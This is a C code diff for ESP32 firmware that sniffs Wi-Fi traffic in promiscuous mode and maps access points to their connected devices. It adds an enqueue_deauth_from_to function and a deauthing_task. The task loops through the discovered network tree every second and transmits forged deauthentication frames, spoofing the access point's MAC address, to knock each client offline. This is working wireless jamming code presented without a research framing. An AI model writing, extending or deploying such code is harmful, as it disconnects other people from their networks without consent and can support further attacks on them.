@@ -25,6 +25,7 @@
 
 #define RX_BUFFER_AMOUNT 10
 #define RX_RESOURCE_SEMAPHORE 10
+
 #define MAX_RECEIVED_PACKETS 7 
 
 #define TX_BUFFER_AMOUNT 10 
@@ -507,6 +508,8 @@ void on_receive(wifi_promiscuous_pkt_t *packet)
     wifi_promiscuous_pkt_t *packet_queue_copy = malloc(packet->rx_ctrl.sig_len + 28 - 4);
     memcpy(packet_queue_copy, packet, packet->rx_ctrl.sig_len + 28-4);
     // ESP_LOGW(TAG, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");
+	// Incredible, if I comment out the following line the program soon 
+	// ping pongs between the reading and the sending task, as if the hardware task was killed.
     ESP_LOG_BUFFER_HEXDUMP("packet-content from open_mac_rx_callback", packet->payload, 200, ESP_LOG_INFO);
     // ESP_LOGW(TAG, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");
     if (!(xQueueSendToBack(packet_reception_queue, &packet_queue_copy, 0)))
@@ -641,6 +644,39 @@ void send_deauth_from_to(const void *data)
 	transmit_one(custom_deauth_packet, 0, 20);
 }
 
+void enqueue_deauth_from_to(const void *data)
+{
+	const CoupleAP_DEV *couple = (const CoupleAP_DEV *)data;
+	const uint8_t *ap_mac = couple->ap.mac;
+	const uint8_t *dev_mac = couple->dev.mac;
+	// Use custom deauth packet, substitute the MAC addresses
+	memcpy(custom_deauth_packet + 12, dev_mac, 6);
+	memcpy(custom_deauth_packet + 18, ap_mac, 6);
+	memcpy(custom_deauth_packet + 24, ap_mac, 6);
+	// Send the packet
+	if(!xSemaphoreTake(tx_queue_resources, 1))
+	{
+		ESP_LOGE(TAG, "TX semaphore full!");
+		return;
+	}
+	// uint8_t *queue_copy = (uint8_t *)malloc(26);
+	// memcpy(queue_copy, custom_deauth_packet, 26);
+	// hardware_queue_entry_t queue_entry;
+	// queue_entry.type = TX_ENTRY;
+	// queue_entry.content.tx.len = 26;
+	// queue_entry.content.tx.packet = queue_copy;
+	// xQueueSendToBack(hardware_event_queue, &queue_entry, 0);
+	// Allocate for a copy of the packet the size of custom_deauth_packet
+	uint8_t *deauth_packet_queue_copy = (uint8_t *)malloc(sizeof(custom_deauth_packet));
+	memcpy(deauth_packet_queue_copy, custom_deauth_packet, sizeof(custom_deauth_packet));
+	hardware_queue_entry_t queue_entry;
+	queue_entry.type = TX_ENTRY;
+	queue_entry.content.tx.len = sizeof(custom_deauth_packet);
+	queue_entry.content.tx.packet = deauth_packet_queue_copy;
+	xQueueSendToBack(hardware_event_queue, &queue_entry, 0);
+	// ESP_LOGI(TAG, "TX entry queued");
+}
+
 void wifi_hardware_task(void *pvParameter) 
 {
     wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
@@ -651,12 +687,12 @@ void wifi_hardware_task(void *pvParameter)
 	cfg.amsdu_tx_enable = false;
 	cfg.nvs_enable = false;	
 
-	hardware_event_queue = xQueueCreate(RX_RESOURCE_SEMAPHORE, sizeof(hardware_queue_entry_t));
+	hardware_event_queue = xQueueCreate(RX_RESOURCE_SEMAPHORE+TX_RESOURCE_SEMAPHORE, sizeof(hardware_queue_entry_t));
 	assert(hardware_event_queue);
 	rx_queue_resources = xSemaphoreCreateCounting(RX_RESOURCE_SEMAPHORE, RX_RESOURCE_SEMAPHORE);
 	assert(rx_queue_resources);
-	// tx_queue_resources = xSemaphoreCreateCounting(TX_RESOURCE_SEMAPHORE, TX_RESOURCE_SEMAPHORE);
-	// assert(tx_queue_resources);
+	tx_queue_resources = xSemaphoreCreateCounting(TX_RESOURCE_SEMAPHORE, TX_RESOURCE_SEMAPHORE);
+	assert(tx_queue_resources);
 
 	// packet_reception_queue = xQueueCreate(20, sizeof(wifi_promiscuous_pkt_t *));
 
@@ -808,12 +844,18 @@ void wifi_hardware_task(void *pvParameter)
 					}
 					xSemaphoreGive(rx_queue_resources);
 				}
-				// else if (queue_entry.type == TX_ENTRY)
-				// {
-				// 	transmit_one(0);
-				// 	// free
-				// 	xSemaphoreGive(tx_queue_resources);
-				// }
+				else if (queue_entry.type == TX_ENTRY)
+				{
+					ESP_LOGI(TAG, "TX_ENTRY received");
+					// using transmit_one, send the packet in the queue_entry
+
+					uint8_t *packet = queue_entry.content.tx.packet;
+					uint32_t len = queue_entry.content.tx.len;
+					transmit_one(packet, 0, 5);
+					free(packet);
+					ESP_LOGI(TAG, "Packet sent");
+					xSemaphoreGive(tx_queue_resources);
+				}
 				else
 				{
 					ESP_LOGI(TAG, "unknown queue type");
@@ -829,6 +871,7 @@ void wifi_hardware_task(void *pvParameter)
 void reading_task(void *ignored)
 {
     ESP_LOGI(TAG, "Starting reading_task");
+	vTaskDelay(1000 / portTICK_PERIOD_MS);
 
     packet_reception_queue = xQueueCreate(10, sizeof(wifi_promiscuous_pkt_t *));
     // assert(reception_queue);
@@ -867,13 +910,33 @@ void reading_task(void *ignored)
 			// process_tree(network, send_deauth_from_to);
 
             free(packet);
+			vTaskDelay(1000 / portTICK_PERIOD_MS);
         }
         else
         {
             ESP_LOGI(TAG, "xQueueReceive did not receive from packet_reception_queue");
+			vTaskDelay(1000 / portTICK_PERIOD_MS);
         }
 	}
     // {
     //     ESP_LOGI(TAG, "MAC RX queue entry added");
     // }	
+}
+
+void deauthing_task(void *ignored)
+{
+	// This function will constantly read the network tree and send deauth packets by 
+	// enqueueing deauthentication frames as events in the hardware_event_queue,
+
+	while(true)
+	{
+		if (!network)
+		{
+			ESP_LOGI(TAG, "Network is empty");
+			vTaskDelay(1000 / portTICK_PERIOD_MS);
+			continue;
+		}
+		process_tree(network, enqueue_deauth_from_to);
+		vTaskDelay(1000 / portTICK_PERIOD_MS);
+	}
 }
